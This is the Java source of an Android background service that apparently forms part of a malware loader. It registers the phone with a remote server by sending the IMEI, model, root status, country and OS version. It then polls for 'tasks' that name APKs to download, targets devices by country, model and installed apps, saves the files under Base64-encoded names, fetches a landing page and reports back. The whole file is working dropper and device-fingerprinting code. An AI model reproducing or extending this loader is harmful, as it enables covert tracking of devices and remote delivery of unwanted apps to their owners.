package task.loader;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

import task.loader.db.TableTasks;
import task.loader.db.Task;

public class MainService extends IntentService
{
    private static AtomicBoolean active = new AtomicBoolean(false);

    public MainService()
    {
        super("");
    }

    public static boolean isActive()
    {
        return active.get();
    }

    @Override
    protected void onHandleIntent(Intent intent)
    {
        if(Settings.isBlock(this))
            return;

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
        wakeLock.acquire();

        active.set(true);
        try
        {

            Settings settings = Settings.getInstance(this);
            if(settings.isInit())
            {
                final String action = intent.getAction();
                if(Constants.DEBUG) Settings.debug("service action: " + action);

                if(action != null)
                    req_init_actionSet(action); // req 4
                else
                    req_init_noAction(); // req 2
            }
            else
                req_init(); // req 1

        }
        catch (Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }

        active.set(false);

        wakeLock.release();
    }

    private void req_init()
    {
        Connection connection = new Connection(this, new ConnectionTask()
        {
            @Override
            public boolean run(Context context, Settings settings)
            {

                try
                {
                    TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

                    // NEW REQUEST
                    if (Constants.DEBUG) Settings.debug("Start request with req: 1");
                    NetworkTask ntask = new NetworkTask();

                    Map<String, String> params = new HashMap<>();
                    params.put("req", "1");
                    params.put("imei", Utils.getImei(context));
                    params.put("uniqnum", settings.getId());
                    params.put("model", Build.MODEL);
                    params.put("root", Utils.isRootAvailable() ? "1" : "2");
                    params.put("country", telephonyManager.getNetworkCountryIso());
                    params.put("osver", Build.VERSION.RELEASE);

                    String body = Utils.getPostBody(params);
                    ntask.postAdd(body);

                    String url = settings.getServer();
                    String page = ntask.exec(url);

                    if (Constants.DEBUG)
                    {
                        Settings.debug("============== REQ 1 - Registration ======================");
                        Settings.debug("FIELDS: ");
                        for (String field: params.keySet()){
                            Settings.debug(field + ": " + params.get(field));
                        }
                        Settings.debug("URL: " + url + "\nresponse: " + page);
                        Settings.debug("====================================");
                    }

                    if (Utils.isSuccessResponse(page))
                    {
                        settings.setInit();
                        return true;
                    }else{
                        if (Constants.DEBUG)
                            Settings.debug("req_init isSuccessResponse FAIL: " + page);
                    }
                }
                catch (Exception ex)
                {
                    Settings.debug("req_init ERROR");
                    if(Constants.DEBUG) Settings.debug(ex);
                }

                return false;
            }
        });

        connection.start();
    }

    private void req_init_actionSet(final String action)
    {
        Connection connection = new Connection(this, new ConnectionTask()
        {
            @Override
            public boolean run(Context context, Settings settings)
            {

                try
                {

                    if (Constants.DEBUG) Settings.debug("Start request with req: 4");
                    NetworkTask ntask = new NetworkTask();
                    Map<String, String> params = new HashMap<>();
                    params.put("req", "4");
                    params.put("imei", Utils.getImei(context));
                    params.put("number", action);
                    params.put("uniqnum", settings.getId());
                    String body = Utils.getPostBody(params);
                    ntask.postAdd(body);

                    String url = settings.getServer();
                    String page = ntask.exec(url);

                    if (Constants.DEBUG)
                    {
                        Settings.debug("============== REQ 4 - task is done =================");
                        Settings.debug("FIELDS: ");
                        for (String field: params.keySet()){
                            Settings.debug(field + ": " + params.get(field));
                        }
                        Settings.debug("URL: " + url + "\nresponse: " + page);
                        Settings.debug("====================================");
                    }

                    boolean res = Utils.isSuccessResponse(page);
                    if (Constants.DEBUG) {
                        if (!res)
                            Settings.debug("req_init_actionSet isSuccessResponse FAIL: " + page);
                    }
                    return res;
                }
                catch (Exception ex)
                {
                    Settings.debug("req_init_actionSet ERROR");
                    if(Constants.DEBUG) Settings.debug(ex);
                }

                return false;
            }
        });

        connection.start();
    }

    private void req_init_noAction()
    {

        Connection connection = new Connection(this, new ConnectionTask()
        {
            @Override
            public boolean run(Context context, Settings settings)
            {

                try
                {
                    if (Constants.DEBUG) Settings.debug("Start request with req: 2");
                    NetworkTask ntask = new NetworkTask();

                    Map<String, String> params = new HashMap<>();
                    params.put("req", "2");
                    params.put("imei", Utils.getImei(context));
                    params.put("uniqnum", settings.getId());

                    String body = Utils.getPostBody(params);
                    ntask.postAdd(body);

                    String url = settings.getServer();
                    String page = ntask.exec(url);

                    if (Constants.DEBUG)
                    {
                        Settings.debug("============== REQ 2 - get new task =================");
                        Settings.debug("FIELDS: ");
                        for (String field: params.keySet()){
                            Settings.debug(field + ": " + params.get(field));
                        }

                        Settings.debug("URL: " + url + "\nresponse: " + page);
                        Settings.debug("====================================");
                    }

                    parseResponse(page);
                    return true;

                }
                catch (Exception ex)
                {
                    Settings.debug("req_init_noAction ERROR");
                    if (Constants.DEBUG) Settings.debug(ex);
                }

                return false; // try other server; see Connection.java
            }
        });

        connection.start();
    }

    private void parseResponse(String data)
    {
        if(Constants.DEBUG) Settings.debug("raw: " + data);

        JSONObject json = null;
        String taskId = "";

        try
        {
            json = new JSONObject(data);
            if(Constants.DEBUG) Settings.debug("json: " + json.toString(4));
            taskId = json.getString("number");
        }catch (Exception e){
            if(Constants.DEBUG) Settings.debug("REQ 2: no new tasks or bad json: " + data);
            return;
        }

        try
        {
            String path = json.getString("url");
            String packageName = json.getString("package").toLowerCase();

            int length = json.getInt("size");
            int requestCount = json.getInt("times");
            int root = json.optInt("root");

            String model = json.optString("model", null);
            String osver = json.optString("osver", null);
            JSONArray countries = json.optJSONArray("country");
            JSONObject packageOptions = json.optJSONObject("pack");
            String landing = json.optString("landing", "");

            if(root == 1 && !Utils.isRootAvailable())
            {
                if(Constants.DEBUG) Settings.debug("need root!");
                return;
            }

            if(root == 2 && Utils.isRootAvailable())
            {
                if(Constants.DEBUG) Settings.debug("not need root!");
                return;
            }

            if(model != null && !model.equals(Build.MODEL))
            {
                if(Constants.DEBUG) Settings.debug("not correct model!");

                return;
            }

            if(osver != null && !osver.equals(Build.VERSION.RELEASE))
            {
                if(Constants.DEBUG) Settings.debug("not correct version!");

                return;
            }

            if(countries != null && countries.length() > 0 )
            {
                boolean find = false;
                for (int i = 0; i < countries.length(); i++)
                {
                    String country = countries.getString(i);
                    if(country.equalsIgnoreCase(Locale.getDefault().getCountry()))
                    {
                        find = true;
                        break;
                    }
                }

                if(!find)
                {
                    if (Constants.DEBUG) Settings.debug("not correct country!");
                    return;
                }
            }

            if(packageOptions != null)
            {
                JSONArray needExist = packageOptions.optJSONArray("packy");
                JSONArray notNeedExist = packageOptions.optJSONArray("packn");

                if(needExist != null)
                {
                    boolean find = false;

                    for(int i = 0; i < needExist.length(); i++)
                    {
                        String name = needExist.getString(i);
                        if(Utils.isInstalledPackage(this, name))
                        {
                            find = true;
                            break;
                        }
                    }

                    if(!find)
                    {
                        if(Constants.DEBUG) Settings.debug("not found need app");

                        return;
                    }
                }


                if(notNeedExist != null)
                {
                    for(int i = 0; i < notNeedExist.length(); i++)
                    {
                        String name = notNeedExist.getString(i);
                        if(Utils.isInstalledPackage(this, name))
                        {
                            if(Constants.DEBUG) Settings.debug("found not need app: " + name);

                            return;
                        }
                    }
                }
            }


            TableTasks tableTasks = new TableTasks(MainApplication.getMainDb());
            Task task = tableTasks.getTaskByPackage(packageName);

            boolean installed = Utils.isInstalledPackage(this, packageName);

            if(Constants.DEBUG) Settings.debug(String.format("installed[%s]: %b", packageName, installed));

            if(task != null)
            {
                if(Constants.DEBUG) Settings.debug("Task already exists");
                return;
            }

            if(installed)
            {
                if(Constants.DEBUG) Settings.debug("Package " + packageName + " already installed!");
                return;
            }

            if(!Constants.DOWNLOADS_DIR.exists()) Constants.DOWNLOADS_DIR.mkdirs();

            byte[] data64 = packageName.getBytes("UTF-8");
            String pkg = Base64.encodeToString(data64, Base64.DEFAULT);

            File file = new File(Constants.DOWNLOADS_DIR, pkg + ".apk");
            if(!file.exists() || file.length() != length)
            {
                if (Constants.DEBUG) Settings.debug("start download");
                NetworkTask ntask = new NetworkTask();
                int code = ntask.getFile(path, file);

                if (Constants.DEBUG) Settings.debug("download code: " + code);
                if (code == 200)
                {
                    task = new Task(requestCount, packageName, file.getAbsolutePath(), taskId);
                    tableTasks.insert(task);
                    saveLanding(landing);
                    confirmTask(taskId); // send req 3
                }
            }
            else
            {
                if (Constants.DEBUG) Settings.debug("apk already exist and valid");

                task = new Task(requestCount, packageName, file.getAbsolutePath(), taskId);
                tableTasks.insert(task);

                saveLanding(landing);

                confirmTask(taskId); // send req 3
            }
        }catch (Exception e) {
            if(Constants.DEBUG) Settings.debug(e);
        }
    }

    private void confirmTask(final String id)
    {

        Connection connection = new Connection(this, new ConnectionTask()
        {
            @Override
            public boolean run(Context context, Settings settings)
            {


                if (Constants.DEBUG) Settings.debug("Start request with req: 3");
                NetworkTask ntask = new NetworkTask();

                Map<String, String> params = new HashMap<>();
                params.put("req", "3");
                params.put("imei", Utils.getImei(context));
                params.put("number", id);
                params.put("uniqnum", settings.getId());

                String body = Utils.getPostBody(params);
                ntask.postAdd(body);

                String url = settings.getServer();
                String page = ntask.exec(url);

                if (Constants.DEBUG)
                {
                    Settings.debug("============== REQ 3 - task is created in sqlite =================");
                    Settings.debug("FIELDS: ");
                    for (String field: params.keySet()){
                        Settings.debug(field + ": " + params.get(field));
                    }
                    Settings.debug("URL: " + url + "\nresponse: " + page);
                    Settings.debug("====================================");
                }

                boolean res = Utils.isSuccessResponse(page);
                if (Constants.DEBUG) {
                    if (!res)
                        Settings.debug("req_init_actionSet isSuccessResponse FAIL: " + page);
                }
                return res;
            }
        });

        connection.start();

    }


    private void saveLanding(String url)
    {
        if(url.isEmpty())
        {
            if (Constants.DEBUG) Settings.debug(getClass().getName() + "::saveLanding(): url is empty; skip");
            return;
        }

        if (Constants.DEBUG) Settings.debug(getClass().getName() + "::saveLanding(): url: " + url);

        try
        {
            File htmlFile = Utils.getLangingFile(this);

            if (Constants.DEBUG) Settings.debug(getClass().getName() + "::saveLanding(): htmlFile: " + htmlFile);

            NetworkTask ntask = new NetworkTask();
            int code = ntask.getFile(url, htmlFile);
//            int code = HttpRequest.get(url).receive(htmlFile).code();

            if (Constants.DEBUG) Settings.debug("landing http code: " + code);

            if(code != 200)
            {
                htmlFile.delete();
            }

        }
        catch (Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }
    }

}
